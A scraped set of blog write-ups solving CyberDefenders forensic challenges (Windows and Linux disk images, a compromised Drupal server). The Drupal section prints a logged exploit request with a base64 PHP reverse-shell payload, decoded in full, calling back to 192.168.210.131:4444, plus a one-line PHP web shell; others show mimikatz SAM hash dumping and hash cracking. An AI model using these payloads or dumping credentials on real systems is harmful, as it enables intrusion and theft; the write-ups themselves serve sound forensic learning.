deleted in UTC? (YYYY-MM-DD HH:MM:SS UTC) # Using FTK Imager, I browsed $Recycle.Bin. When a user delete a file, this is the location where the file is put in Windows. To understand how does it works I found this article: Recycle Bin Forensic..\nFrom windows Vista and later the recycler path was renamed as C:\\$Recycle.Bin\\SID*\\$I and C:\\$Recyecle.Bin\\SID*\\$R where $I contains meta data of the deleted file and $R contains actual deleted file.\nWe have this exact structure, let\u0026rsquo;s get the $R date modified timestamp: 29/04/2021 18:19:55. Opening it we can see that it\u0026rsquo;s obviously a password list. The answer has to be in UTC format, we can assume that UTC is the system timezone, but instead let\u0026rsquo;s investigate to confirm. System timezone is located in SYSTEM hive: SYSTEM\\\u0026lt;CurrentControlSet\u0026gt;\\Control\\TimeZoneInformation\\TimeZoneKeyName, which is UTC.\nBut, this is not the answer, you have to provide the $I timestamp. I didn\u0026rsquo;t searched why, to me it\u0026rsquo;s more accurate to provide the $R one but maybe I misuderstood something. Two timestamps are close.\nNote: I couldn\u0026rsquo;t export $Recycle.Bin with FTK Imager, I didn\u0026rsquo;t searched why an error occured. I wanted to add these files into Autopsy to observe if the tool can retrieve deleted files.\nQ5. How many times was Tor Browser ran on the suspect\u0026rsquo;s computer? (number only) # I found this article: Windows Forensics : Evidence of Execution. To summarize, in our case, one interesting artifact is prefecth.\nPrefetch essentially grabs all of the files associated with an application from disk and writes them to memory so the user doesn’t have to wait for them to be loaded from disk.\nIn our case, it could be use to know how many times a given software was launched. Prefetch files are located at: Windows\\Prefetch all files begin by the software name following by an ID. In our case we can find theses two files:\nTORBROWSER-INSTALL-WIN64-10.0-F3C4DF19.pf TORBROWSER-INSTALL-WIN64-10.0-F3C4DF19.pf.FileSlack To read a pf file, I used PECmd (Eric Zimmerman tool), the output contains many informations, I only written the most usefull one for us:\nPECmd.exe -f TORBROWSER-INSTALL-WIN64-10.0-F3C4DF19.pf ... Executable name: TORBROWSER-INSTALL-WIN64-10.0 Hash: F3C4DF19 File size (bytes): 139.504 Version: Windows 10 or Windows 11 Run count: 1 Last run: 2021-04-29 18:22:32 ... An intuitive answer could to answer 1, and that\u0026rsquo;s what I did. But the program we are inspecting is not Tor Brower, it\u0026rsquo;s Tor Installer. As we don\u0026rsquo;t have a pf file for Tor Browser, the user never launched this program, just installed it.\nQ6. What is the suspect\u0026rsquo;s email address? # Autopsy provides an automatic email parser under Analysis Result \u0026gt; Keywords Hits \u0026gt; Email addresses, but there is many email addresses, we have to correlate with other datas. There is no emails sofware installed nor emails datas in the computer. The only way that the user uses email is throught a web browser, let\u0026rsquo;s investigate into Data Artifacts \u0026gt; Web History:\nhttps://protonmail.com/login https://protonmail.com/inbox Unfortunately, we have 6 proton emails addresses in the computer:\ncontact@protonmail.com dreammaker82@protonmail.com notify@protonmail.com security@protonmail.com support@protonmail.com username2@protonmail.com Using the Data Artifacts \u0026gt; Web Form Autofill, which are the web browser form saved values, we can see a known username dreammaker82. Theses datas can be accessed at: Users/John Doe/AppData/Local/Google/Chrome/User Data/Default/Web Data.\nQ7. What is the FQDN did the suspect port scan? # Which program can be used to make network scanning? Nmap of course, and it\u0026rsquo;s installed on the computer Data Artifacts \u0026gt; Installed Programs.\nSo now the question is, how can I find the nmap history or equivalent? I was unable to find some nmap logs or something else. But as nmap is a CLI-tool, you can retrieve the command launched in the Power-Shell history.\nThe history is located at: Users\\John Doe\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt. Here, you can see that the user perform this network scanning:\nping dfir.science nmap dfir.science Q8. What country was picture \u0026ldquo;20210429_152043.jpg\u0026rdquo; allegedly taken in? # My first idea was to made a reverse Google/Yandex image search. I found nothing interesting, so I decided to inspect metadatas. First, I extracted the file with Autopsy or FTK Imager. Using the Windows property will not show all metadatas, you have to use a dedicated tool. I found this one: Metadata2go. Juste upload the photo and the tool will process the image for you. There is many metadatas and some of them are really interesting:\ngps_latitude: 16 deg 0\u0026#39; 0.00\u0026#34; S gps_longitude: 23 deg 0\u0026#39; 0.00\u0026#34; E gps_position: 16 deg 0\u0026#39; 0.00\u0026#34; S, 23 deg 0\u0026#39; 0.00\u0026#34; E Itilog.com will give you the location from the coordinates. Please be sure how the coordinate system works, otherwise the tool will give you a wrong country (Chad). As the latitude is with the letter \u0026lsquo;S\u0026rsquo;, you have to provide this value too. The country is Zambia.\nQ9. What is the parent folder name picture \u0026ldquo;20210429_151535.jpg\u0026rdquo; was in before the suspect copy it to \u0026ldquo;contact\u0026rdquo; folder on his desktop? # I was not able to answer this question, but it\u0026rsquo;s quite easy, I quote this another writeup from jamesgibbins.com\nLooking at the file metadata in Autopsy, we can see it was taken by an LG Electronics LM-Q725K, which is a smartphone. If we look in USB Device Attached, we can see it there too: LG Electronics, Inc. LM-X420xxx/G2/G3 Android Phone (MTP/download mode). Background knowledge time, many cameras store photos in a DCIM, or a subfolder of this folder. If we search for DCIM, we get a Shell Bags Artifact relating to this photo: My Computer\\LG Q7\\Internal storage\\DCIM\\Camera\nQ10. A Windows password hashes for an account are below. What is the user\u0026rsquo;s password? # The question give this information:\nAnon:1001:aad3b435b51404eeaad3b435b51404ee:3DE1A36F6DDB8E036DFD75E8E20C4AF4::: I don\u0026rsquo;t know why this question pop, its not related at all to the challenge. Use an online tool, or John or Hashcat.\nQ11. What is the user \u0026ldquo;John Doe\u0026rsquo;s\u0026rdquo; Windows login password? # Users informations, included NTLM password, hashes are stored in SAM hive. But Autopsy can\u0026rsquo;t read them (maybe because it\u0026rsquo;s protected?), we have to be more more \u0026ldquo;aggressive\u0026rdquo;. Mimikatz can be used to dump NTLM hashes.\nOnce you have deactivated securities (Mimikatz is a well-known offensive tool, flagged by every security solution), let\u0026rsquo;s launch the tool. It was the first time I used this tool, apologies for mistakes. Before dumping hashes, you have to export SAM and SYSTEM hives.\n.#####. mimikatz 2.2.0 (x86) #19041 Sep 19 2022 17:43:26 .## ^ ##. \u0026#34;A La Vie, A L\u0026#39;Amour\u0026#34; - (oe.eo) ## / \\ ## /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com ) ## \\ / ## \u0026gt; https://blog.gentilkiwi.com/mimikatz \u0026#39;## v ##\u0026#39; Vincent LE TOUX ( vincent.letoux@gmail.com ) \u0026#39;#####\u0026#39; \u0026gt; https://pingcastle.com / https://mysmartlogon.com ***/ mimikatz # lsadump::sam /system:\u0026lt;SYSTEM file path\u0026gt; /sam:\u0026lt;SAM file path\u0026gt; ... RID : 000003e9 (1001) User : John Doe Hash NTLM: ecf53750b76cc9a62057ca85ff4c850e Supplemental Credentials: * Primary:NTLM-Strong-NTOWF * Random Value : 7844054d945112afaa36825b3ffcedfc ... The tool will display all user information, including sensitive datas such as password hashes. Now, you just have to launch a password cracker like John or Hashcat to brute-force the hash and retrieve the password. It\u0026rsquo;s an easy password so you should not wait too long.\n","date":"12 août 2023","permalink":"/write-up/cyberdefenders-digital-forensic-african-falls/","section":"Write-up","summary":"The scenario:\nJohn Doe was accused of doing illegal activities. A disk image of his laptop was taken.","title":"Cyberdefenders · Digital Forensic · African Falls"},{"content":"The scenario:\nA soc analyst has been called to analyze a compromised Linux web server. Figure out how the threat actor gained access, what modifications were applied to the system, and what persistent techniques were utilized. (e.g. backdoors, users, sessions, etc).\nDrupal CMS illustration. Abstract # This article revolves around the investigation of a compromised Linux web server by a SOC analyst. The key objectives are to determine how the threat actor gained access, identify system modifications, and uncover persistent techniques used, including backdoors and user manipulation. The article explores various methods and tools for extracting crucial information, such as system logs, password files, user activities, and system configurations.\nIt delves into examining timestamps, authentication attacks, user creations, privilege escalation, and exploitation attempts. The analysis reveals the CMS version, attacker\u0026rsquo;s reverse shell, deleted files, and more, providing valuable insights into the incident response process for compromised Linux systems.\nQ1. What is the system timezone? # We can see this information here: /etc/timezone.\nQ2. Who was the last user to log in to the system? # The interesting file is var/log/wtmp, as this file is encoded, you can not display its content. To read it you can use this command:\nlast -f var/log/wtmp mail pts/1 192.168.210.131 Sat Oct 5 14:23 - 14:24 (00:00) Q3. What was the source port the user \u0026lsquo;mail\u0026rsquo; connected from? # Let\u0026rsquo;s check logs file: var/log/auth.log search for \u0026lsquo;mail\u0026rsquo; and the latest entry (most recent one).\nOct 5 13:23:34 VulnOSv2 sshd[3108]: Accepted password for mail from 192.168.210.131 port 57708 ssh2 Q4. How long was the last session for user \u0026lsquo;mail\u0026rsquo;? (Minutes only) # You can have this information with the same command as Q2. We can see that the connection begun at 14:23 and ended at 14:24.\nlast -f wtmp mail pts/1 192.168.210.131 Sat Oct 5 14:23 - 14:24 (00:00) Q5. Which server service did the last user use to log in to the system? # You have the service name in the Q3: sshd.\nQ6. What type of authentication attack was performed against the target machine? # Searching the differences between wtmp and btmp, I found that btmp keep track of failed login attempts. Using last -f var/log/btmp, you can see many failed attempts, I \u0026ldquo;piped\u0026rdquo; it with grep -c (counting results) and the command returns 1298 results. It\u0026rsquo;s kind of brute-force.\nQ7. How many IP addresses are listed in the \u0026lsquo;/var/log/lastlog\u0026rsquo; file? # You can use strings on lastlog, or an other way is to use this Python tool: Lastlogcsv:\npython3 -m lastlogcsv -i lastlog -o lastlog.csv The tool will convert lastlog into a csv file.\nQ8. How many users have a login shell? # An interesting file to read for users informations is etc/passwd. To understand it, I found this article from Linux Handbook: What is Login Shell in Linux?. To summarize, there is an usefull images from the article. Please take a look, we will need it for following questions:\netc/passwd explaination If an user has a login shell, the last column must be /bin/bash. To count the number of user who have a login shell I used:\ngrep -c \u0026#39;/bin/bash\u0026#39; etc/passwd 5 Q9. What is the password of the mail user? # The file etc/shadow contains password informations about users passwords. The first column is the user name and the following one is the hashed password. But this is not only the hashed password, according to this site: /etc/shadow and Creating yescrypt, MD5, SHA-256, and SHA-512 Password Hashes, $6$ means that the password was hashed with SHA-512.\nmail:$6$zLaoLV8N$BNxYZUxvXiZwb3UjBhCxnxd9Mb02DDUF.GfMj1kbLB.s/quBVtMM4QjfOvmZvfqeh7BuLXaRvRSfpQgNI5prE.:18174:0:99999:7::: Using programs like John The Ripper or Hashcat, you will retrieve the mail\u0026rsquo;s password, which is forensics.\nQ10. Which user account was created by the attacker? # I searched on internet regarding user creation logs and I found this topic: Where can I find logs regarding the user creation?. The point is to check /var/log/auth.log and search on useradd command. We can see that the root user (previously brute-forced) created a user named php and add it to the sudo group.\nOct 5 13:06:38 VulnOSv2 sudo: root : TTY=pts/0 ; PWD=/tmp ; USER=root ; COMMAND=/usr/sbin/useradd -d /usr/php -m --system --shell /bin/bash --skel /etc/skel -G sudo php Oct 5 13:06:38 VulnOSv2 sudo: pam_unix(sudo:session): session opened for user root by (uid=0) Oct 5 13:06:38 VulnOSv2 useradd[2525]: new group: name=php, GID=999 Oct 5 13:06:38 VulnOSv2 useradd[2525]: new user: name=php, UID=999, GID=999, home=/usr/php, shell=/bin/bash Oct 5 13:06:38 VulnOSv2 useradd[2525]: add \u0026#39;php\u0026#39; to group \u0026#39;sudo\u0026#39; Oct 5 13:06:38 VulnOSv2 useradd[2525]: add \u0026#39;php\u0026#39; to shadow group \u0026#39;sudo\u0026#39; Q11. How many user groups exist on the machine? # User group informations are stored in etc/group file, each line is a user group and the file has lines 58 lines.\nQ12. How many users have sudo access? # Sudo access means that an user is in the sudo group. Display the sudo group line in etc/group and you will see all the user in this group.\n$ grep \u0026#39;sudo\u0026#39; etc/group sudo❌27:php,mail Q13. What is the home directory of the PHP user? # This kind of information can be found inside the etc/passwd file:\nphp❌999:999::/usr/php:/bin/bash Columns are delimited by the : symbol. You will easily find online the meaning of each, for us what is important is the first and the penultimate one, which are the username and the user home directory.\nQ14. What command did the attacker use to gain root privilege? # Command history are located in ~/.bash_history where ~/ means the user\u0026rsquo;s home directory. Thanks to the previous questions, we know that the attacker compromissed the mail user so we have to know where the mail\u0026rsquo;s home directory is. I used the same file as the previous question and found how the attackers gained root privilege.\n$ grep \u0026#39;mail\u0026#39; etc/passwd mail❌8:8:mail:/var/mail:/bin/bash --- $ cat /var/mail/.bash_history sudo su - ... Q15. Which file did the user \u0026lsquo;root\u0026rsquo; delete? # This information must be logged into root\u0026rsquo;s ~/.bash_history file. Like the previous question, let\u0026rsquo;s find the root\u0026rsquo;s home directory in etc/passwd:\nroot❌0:0:root:/root:/bin/bash ... Into root we find the bash history file and it contains one interesting line:\nrm 37292.c Q16. Recover the deleted file, open it and extract the exploit author name. # I didn\u0026rsquo;t made this question, I downloaded foremost but as my current computer is very old and without many RAM, the program don\u0026rsquo;t wanted to start. You have to use a recovery tool like foremost or scalpel.\nQ17. What is the content management system (CMS) installed on the machine? # First, I tought it was a Wordpress, because of the php, mysql and phpmyadmin directories in etc/. I searched on etc/apache2/sites-available and found this line in 000-default.conf file:\nDocumentRoot /var/www/html Note that this location is a common one for website. This is the website\u0026rsquo;s files location, in this directory I opened /var/www/jabc/index.php, without finding the solution. In fact, it was written under my eyes, but I didn\u0026rsquo;t noticed it!\n\u0026lt;?php /** * @file * The PHP page that serves all page requests on a Drupal installation. I continued my research, I opened var/html/www/jabc/.htaccess which is a shortcut, my OS told me:\nUnable to access the given target: /etc/drupal/7/htaccess because it does not exists.\nWhich is normal as I mounted this drive, the shortcuts will not work anymore. But now I have the file path, intrigued by \u0026ldquo;grupal\u0026rdquo;, I opened the htaccess file:\n# # Apache/PHP/Drupal settings: # ... Searching for what is Drupal gave me the answer, it\u0026rsquo;s an open source CMS!\nQ18. What is the version of the CMS installed on the machine? # The exact version number is quite hidden. I searched in some of the config files but couldn\u0026rsquo;t find the exact version number. I finaly tried to explore the themes files, supposing that the exact version number may displayed to compatibility reasons, I was true! Open var/www/html/jabc/themes/bartik/bartik.info:\n; Information added by Drupal.org packaging script on 2014-01-15 version = \u0026#34;7.26\u0026#34; project = \u0026#34;drupal\u0026#34; datestamp = \u0026#34;1389815930\u0026#34; Q19. Which port was listening to receive the attacker\u0026rsquo;s reverse shell? # Firstly, I searched what the attacker did, thanks the Q15, we have the root\u0026rsquo;s user home directory and so its .bash_history file. You could read this:\ncd /var/www/html/ ll cd jabc ll cat .htaccess ll vim scripts/update.php ls -lh scripts/ w logout The user go to var/www/html/jabc/ and create or modify update.php and logout. Let\u0026rsquo;s open this file:\n\u0026lt;?php system($_GET[\u0026#39;cmd\u0026#39;]); ?\u0026gt; If you don\u0026rsquo;t know PHP, this line means that the system will execute the string passed into the URL variable cmd. This is a reverse shell.\nFor example an user go on this page: \u0026lt;base url\u0026gt;/update.php?cmd=ls the PHP script will execute system('ls'), which is basically a command line prompt, and so, a backdoor.\nIn var/log/access.log, the user we can see that an user uses this backdoor (last line):\n192.168.210.131 - - [05/Oct/2019:13:17:54 +0200] \u0026#34;GET /jabc/scripts/update.php?cmd=ls HTTP/1.1\u0026#34; 200 244 \u0026#34;-\u0026#34; \u0026#34;Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0\u0026#34; More interesting, we can see a more offensive access:\n192.168.210.131 - - [05/Oct/2019:13:01:27 +0200] \u0026#34;POST /jabc/?q=user/password\u0026amp;name%5b%23post_render%5d%5b%5d=assert\u0026amp;name%5b%23markup%5d=eval%28base64_decode%28Lyo8P3BocCAvKiovIGVycm9yX3JlcG9ydGluZygwKTsgJGlwID0gJzE5Mi4xNjguMjEwLjEzMSc7ICRwb3J0ID0gNDQ0NDsgaWYgKCgkZiA9ICdzdHJlYW1fc29ja2V0X2NsaWVudCcpICYmIGlzX2NhbGxhYmxlKCRmKSkgeyAkcyA9ICRmKCJ0Y3A6Ly97JGlwfTp7JHBvcnR9Iik7ICRzX3R5cGUgPSAnc3RyZWFtJzsgfSBpZiAoISRzICYmICgkZiA9ICdmc29ja29wZW4nKSAmJiBpc19jYWxsYWJsZSgkZikpIHsgJHMgPSAkZigkaXAsICRwb3J0KTsgJHNfdHlwZSA9ICdzdHJlYW0nOyB9IGlmICghJHMgJiYgKCRmID0gJ3NvY2tldF9jcmVhdGUnKSAmJiBpc19jYWxsYWJsZSgkZikpIHsgJHMgPSAkZihBRl9JTkVULCBTT0NLX1NUUkVBTSwgU09MX1RDUCk7ICRyZXMgPSBAc29ja2V0X2Nvbm5lY3QoJHMsICRpcCwgJHBvcnQpOyBpZiAoISRyZXMpIHsgZGllKCk7IH0gJHNfdHlwZSA9ICdzb2NrZXQnOyB9IGlmICghJHNfdHlwZSkgeyBkaWUoJ25vIHNvY2tldCBmdW5jcycpOyB9IGlmICghJHMpIHsgZGllKCdubyBzb2NrZXQnKTsgfSBzd2l0Y2ggKCRzX3R5cGUpIHsgY2FzZSAnc3RyZWFtJzogJGxlbiA9IGZyZWFkKCRzLCA0KTsgYnJlYWs7IGNhc2UgJ3NvY2tldCc6ICRsZW4gPSBzb2NrZXRfcmVhZCgkcywgNCk7IGJyZWFrOyB9IGlmICghJGxlbikgeyBkaWUoKTsgfSAkYSA9IHVucGFj.aygiTmxlbiIsICRsZW4pOyAkbGVuID0gJGFbJ2xlbiddOyAkYiA9ICcnOyB3aGlsZSAoc3RybGVuKCRiKSA8ICRsZW4pIHsgc3dpdGNoICgkc190eXBlKSB7IGNhc2UgJ3N0cmVhbSc6ICRiIC49IGZyZWFkKCRzLCAkbGVuLXN0cmxlbigkYikpOyBicmVhazsgY2FzZSAnc29ja2V0JzogJGIgLj0gc29ja2V0X3JlYWQoJHMsICRsZW4tc3RybGVuKCRiKSk7IGJyZWFrOyB9IH0gJEdMT0JBTFNbJ21zZ3NvY2snXSA9ICRzOyAkR0xPQkFMU1snbXNnc29ja190eXBlJ10gPSAkc190eXBlOyBpZiAoZXh0ZW5zaW9uX2xvYWRlZCgnc3Vob3NpbicpICYmIGluaV9nZXQoJ3N1aG9zaW4uZXhlY3V0b3IuZGlzYWJsZV9ldmFsJykpIHsgJHN1aG9zaW5fYnlwYXNzPWNyZWF0ZV9mdW5jdGlvbignJywgJGIpOyAkc3Vob3Npbl9ieXBhc3MoKTsgfSBlbHNlIHsgZXZhbCgkYik7IH0gZGllKCk7%29%29%3b\u0026amp;name%5b%23type%5d=markup HTTP/1.1\u0026#34; 200 13983 \u0026#34;-\u0026#34; \u0026#34;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)\u0026#34; 192.168.210.131 - - [05/Oct/2019:13:01:27 +0200] \u0026#34;POST /jabc/?q=file/ajax/name/%23value/form-tggMqwbT3cRyS3SWuIRNGj_FB_5N-cux23-NHVF0NrA HTTP/1.1\u0026#34; 200 1977 \u0026#34;-\u0026#34; \u0026#34;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)\u0026#34; There is a base64 encoded payloads, let\u0026rsquo;s decode it:\n/*\u0026lt;?php /**/ error_reporting(0); $ip = \u0026#34;192.168.210.131\u0026#34;; $port = 4444; if (($f = \u0026#34;stream_socket_client\u0026#34;) \u0026amp;\u0026amp; is_callable($f)) { $s = $f(\u0026#34;tcp://{$ip}:{$port}\u0026#34;); $s_type = \u0026#34;stream\u0026#34;; } if (!$s \u0026amp;\u0026amp; ($f = \u0026#34;fsockopen\u0026#34;) \u0026amp;\u0026amp; is_callable($f)) { $s = $f($ip, $port); $s_type = \u0026#34;stream\u0026#34;; } if (!$s \u0026amp;\u0026amp; ($f = \u0026#34;socket_create\u0026#34;) \u0026amp;\u0026amp; is_callable($f)) { $s = $f(AF_INET, SOCK_STREAM, SOL_TCP); $res = @socket_connect($s, $ip, $port); if (!$res) { die(); } $s_type = \u0026#34;socket\u0026#34;; } if (!$s_type) { die(\u0026#34;no socket funcs\u0026#34;); } if (!$s) { die(\u0026#34;no socket\u0026#34;); } switch ($s_type) { case \u0026#34;stream\u0026#34;: $len = fread($s, 4); break; case \u0026#34;socket\u0026#34;: $len = socket_read($s, 4); break; } if (!$len) { die(); } $a = unpack(\u0026#34;Nlen\u0026#34;, $len); $len = $a[\u0026#34;len\u0026#34;]; $b = \u0026#34;\u0026#34;; while (strlen($b) \u0026lt; $len) { switch ($s_type) { case \u0026#34;stream\u0026#34;: $b .= fread($s, $len - strlen($b)); break; case \u0026#34;socket\u0026#34;: $b .= socket_read($s, $len - strlen($b)); break; } } $GLOBALS[\u0026#34;msgsock\u0026#34;] = $s; $GLOBALS[\u0026#34;msgsock_type\u0026#34;] = $s_type; if (extension_loaded(\u0026#34;suhosin\u0026#34;) \u0026amp;\u0026amp; ini_get(\u0026#34;suhosin.executor.disable_eval\u0026#34;)) { $suhosin_bypass = create_function(\u0026#34;\u0026#34;, $b); $suhosin_bypass(); } else { eval($b); } die(); Let\u0026rsquo;s use ChatGPT to explain this code:\nDisables error reporting using error_reporting(0).\nTries to create a stream connection with the specified IP address and port using different available functions. The tested functions are: stream_socket_client, fsockopen, and socket_create.\nIf the connection fails with all tested functions, the script terminates by displaying \u0026ldquo;no socket funcs\u0026rdquo; or \u0026ldquo;no socket,\u0026rdquo; depending on the case.\nIf a connection succeeds, the script reads the first 4 bytes from the connection, which are assumed to represent the length of the data to receive.\nThe data is then read from the connection in several steps to reach the total length indicated by the initial 4 bytes.\nOnce the complete data is read, the evaluated code is executed using the eval function.\nBefore executing the evaluated code, the code checks if the \u0026ldquo;suhosin\u0026rdquo; extension is loaded and if the \u0026ldquo;suhosin.executor.disable_eval\u0026rdquo; configuration is enabled. If so, the code dynamically creates a function to bypass this restriction.\nThe code terminates after executing the evaluated code.\nmode GPT off.\nLe \u0026rsquo;evaluated code\u0026rsquo; is the socket content; what the attackers wants to execute remotely. In this code we have the port used by the attacker!\n","date":"12 août 2023","permalink":"/write-up/cyberdefenders-digital-forensic-hacked/","section":"Write-up","summary":"The scenario:\nA soc analyst has been called to analyze a compromised Linux web server.","title":"Cyberdefenders · Digital Forensic · Hacked"},{"content":"The scenario:\nKaren is a security professional looking for a new job. A company called \u0026ldquo;TAAUSAI\u0026rdquo; offered her a position and asked her to complete a couple of tasks to prove her technical competency. As a soc analyst Analyze the provided disk image and answer the questions based on your understanding of the cases she was assigned to investigate.\nAbstract # In the field of digital forensics, Autopsy shines as a formidable tool that plays a crucial role in analyzing complex scenarios. Autopsy\u0026rsquo;s versatility becomes evident right from the start. It\u0026rsquo;s harnessed to explore every part of the image, and parse lot of file format. The capability to handle AD1 files, known for their complexity, is highlighted, with a recommended approach involving mounting AD1 files with FTK Imager and then leveraging Autopsy\u0026rsquo;s innate parsing tools.\nThroughout the investigation, Autopsy serves as a central hub for extracting and processing crucial data artifacts. The administrator\u0026rsquo;s username, OS\u0026rsquo;s build number, hostname, and other key information are effortlessly. The power of Autopsy to expose web form autofill data, leading to insights like postal codes, or retrieve mail conversations showcases its utility in deriving meaningful information from user activities. The tool\u0026rsquo;s integration with external tools like Eric Zimmerman\u0026rsquo;s tools provides additional pathways for data extraction, enhancing the investigation\u0026rsquo;s depth.\nIn sum, Autopsy emerges as an indispensable digital forensic tool. Its comprehensive features, and inherent ability to handle various data artifacts make it an asset for analysts and investigators.\nAutopsy software interface. First, mount the image using FTK Imager (Windows) or command lines tools (Linux), follow this very good tutorial: Guide: mounting challenge disk image on Linux..\nImportant: AD1 files are painfull to use with Autopsy, If you want to analyse AD1 file with this software, you will have troubles. As Autopsy is very powerfull and embed various parsing tools, it\u0026rsquo;s convenient to use it. My method is to:\nMount AD1 file with FTK Imager\nExport files using FTK Imager (right-click \u0026gt; Export files)\nIn Autopsy, Add Data Source \u0026gt; Logical Files \u0026gt; Add (select the previously exported files)\nData ingestion should now works :)\nQ1. What is the administrator\u0026rsquo;s username? # To see users just open Users directory you will see all the user. Hopefully there is only one user, Karen. To confirm, I have two methods:\nanalyse Windows Registry with Eric Zimmerman\u0026rsquo;s tools or Autopsy to parse SAM\\Domains\\Account\\Users\\Names hive. With Autopsy: Parsing SAM hive using Autopsy. go to OS Account in Autopsy, once ingestion is finished: Explore OS Account using Autopsy. Karen is the only non-disabled account.\nQ2. What is the OS\u0026rsquo;s build number? # Searching on internet I found this article: How to find the Windows 10 build number you are running. It provides the reg key to fint build number: HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion . Using Autopsy you can easily retrive it:\nBuild number using Autopsy. Q3. What is the hostname of the computer? # Using Autopsy, the value is located at Data Artifacts \u0026gt; Operating System Information in the Name column.\nQ4. A messaging application was used to communicate with a fellow Alpaca enthusiest. What is the name of the software? # The simpler is to use Autopsy, search under Data Artifacts \u0026gt; Installed Programs. You will find Skype.\nOr, you can searce in: Horcrux.E01_Partition 3 [3122MB]_PacaLady [NTFS]/[root]/ and you will find Skype-8.41.0.54.exe.\nThird method, searching in the hive: HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths you will see Skype too.\nNote that first and third methods are equivalent, as Autopsy parse hive and key to provides theses informations.\nQ5. What is the zip code of the administrator\u0026rsquo;s post? # The free hint is very usefull:\nCheck browser data.\nUnder Data Artifacts \u0026gt; Web Form Autofill there is a saved value: postal: 19709.\nThe database read by autopsy contains the values ​​which are automatically proposed to you when you wish to fill out a form on your browser. You can also manually browse this database, it\u0026rsquo;s located at: /LogicalFileSet1/Horcrux.E01_Partition 2 [32216MB]_NONAME [NTFS]/[root]/Users/Karen/AppData/Local/Google/Chrome/User Data/Default/Web Data.\nQ6. What are the initials of the person who contacted the admin user from TAAUSAI? # Under Data Artifacts \u0026gt; E-Mail Messages \u0026gt; Default ([Default]) \u0026gt; Default, you will see emails data such as conversations and attached documents. There is lot of interesting informations between Karen Alice and Alpaca Activists. If you don\u0026rsquo;t have Autopsy, you can use OST Viewer you have to find Outlook file and open them with the tool, you will be able to read the emails.\nBy opening the most recent mail, you will see this:\nFrom: Karen Alice \u0026lt;klovespizza@outlook.com\u0026gt; Sent: 22 March 2019 23:37 To: Karen Alice \u0026lt;klovespizza@outlook.com\u0026gt; Subject: RE: Interested in the job MS Things didn’t go as planned with Bob. I attached a copy of our chat history. The password is pacalove MS looks like initials, reading a little bit more mails will inform you that the Alpaca Activists guy is named Michael, we were right, this is initals we looked for.\nQ7. How much money was TAAUSAI willing to pay upfront? # By reading the mail conversation, you will find this mail:\nHi Michael, I’m so sorry for the delay. I meant to send you a message earlier, but I’ve been incredibly busy with my kids and was having issues with Outlook. I’ll be honest with you, I have computer knowledge (I know all about power buttons, how to clean keyboards, and am a pro on internet explorer (I found a way to have Bing and Yahoo as a search bar on my internet explorer web platform)) but don’t know enough to where I think I would be of use for you. I am definitely interested in this opportunity, and want to know what it may require as $150,000 seems like a lot for someone who isn’t too skilled on computers. -Karen Q8. What country is the admin user meeting the hacker group in? # By reading the conversation, you will find this mail:\nHey there! So here\u0026#39;s what we need you to do: We have been conducting an investigation on Bob Redliubeht (the CEO of Alpacamybags Luxury Alpaca handbags) and we believe he\u0026#39;s been mistreating some of his Alpacas. We have heard complaints that he refuses to provide Alpacas with scarfs and beanies during the winter! What we need you to do is gain his trust and then hack his machine. We will give you more information about this in person. Meet us here \u0026#34;27°22’50.10″N, 33°37’54.62″E\u0026#34; Using Google maps, or just Google you will find the country: Egypt.\nQ9. What is the machine\u0026rsquo;s timezone? (Use the three-letter abbreviation) # I used this article: Manual Identification of Suspect Computer Timezone.\nFirst, note the SYSTEM\\Select\\Current key value. In this challenge it\u0026rsquo;s 0x1. After, go to SYSTEM\\ControlSet00\u0026lt;previous_key_value\u0026gt;\\Control\\TimeZoneInformation. In our example, there is only one ControlSet hive but it\u0026rsquo;s good to know how to deal with several.\nCurrent timezone. Q10. When was AlpacaCare.docx last accessed? # Be careful to be in UTC timezone (cf previous question) if you browse the file with your system explorer, instead of FTK Imager. Otherwise, the timestamp will be converted into your timezone and the answer will be wrong.\nThere is a good advantage to use FTK Imager as it does not convert automatically the timezone into your current one. But I was unable to retrieve the timestamp with Autopsy, some of them was set to 0, even if I reset the timezone.\nUsing FTK Imager to retrieve the last accessed timestamp. Q11. There was a second partition on the drive. What is the letter assigned to it? # I found two methods:\nusing Autopsy just go under Data Artifacts \u0026gt; Recent Documents, you will see that there is two partitions; C, the Windows native one, and A.\nbrowse SYSTEM\\MountedDevices value and you will see three partitions: C, D and A. D it\u0026rsquo;s quite different as it looks like a VMWare installation drive (see value).\nQ12. What is the job position offered to Karen? (3 words, 2 spaces in between) # Go through the emails again (see Q6) and read the conversation, you will find this mail:\nOn Sun, Mar 17, 2019 at 2:34 AM Karen Alice \u0026lt;klovespizza@outlook.com\u0026gt; wrote: Hi Michael, The answer is TheCardCriesNoMore -Karen From: Alpaca Activists \u0026lt;taausai@gmail.com\u0026gt; Sent: 16 March 2019 23:19 To: Karen Alice \u0026lt;klovespizza@outlook.com\u0026gt; Subject: Re: Interested in the job Hi Karen, No worries, it happens! We\u0026#39;re just happy to finally hear from you. So I may have lied, my manager is saying that before we can offer you a job, we need to give you a quick test. Can you tell me what the answer to the thing at the bottom is? VGhlQ2FyZENyaWVzTm9Nb3Jl Good Luck! Michael Q13. What is the job position offered to Karen? (3 words, 2 spaces in between) # Go through the emails again (see Q6) and read the conversation, you will find this mail:\nKaren, WOW! That was quick! I have confirmed with my manager that that answer is correct. We didn\u0026#39;t expect you to know the answer, but were really testing you on your ability to quickly learn new things that may be a bit out of your comfort zone. The job position we think you\u0026#39;ll be an awesome fit for is an entry level cyber security analysts. We want someone who\u0026#39;s willing to learn and don\u0026#39;t really care about what you know coming in. We\u0026#39;ll be in touch with more information about what this job entails (and the set up involved with getting you payed), but wanted to give you some material to study in the mean time. ... Q14. When was the admin user password last changed? # User\u0026rsquo;s informations are saved into SAM hive. Firstly, I browsed SAM\\Domains\\Account\\Users\\Names\\Karen but I found nothing interesting. Using Autopsy, this hive looks bit empty, it\u0026rsquo;s because the SAM hive in encrypted. To decrypt it, use Reg Ripper 3.0. It\u0026rsquo;s very easy to use and it will produce a report, here is the Karen\u0026rsquo;s part:\nUsername : Karen [1001] SID : 